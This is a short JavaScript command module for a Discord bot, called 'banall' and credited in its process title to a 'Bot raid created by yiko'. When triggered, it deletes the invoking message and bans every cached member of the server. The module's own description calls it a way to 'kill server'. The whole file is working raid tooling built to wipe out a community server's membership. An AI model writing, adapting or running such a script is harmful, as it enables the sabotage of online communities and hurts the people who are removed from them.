
module.exports = {
  name: 'banall',
  description: 'kill server with your config!',
  async execute(message, args) {
    message.delete()

            process.title = `banall executed | Bot raid created by yiko`

    
    const PromsesaVan = [];

    const mebmersID = message.guild.members.cache.filter(user => user.id )

    const promeses = mebmersID.map(user => {
      PromsesaVan.push(user.ban())
    })

  await Promise.all(promeses)
}
};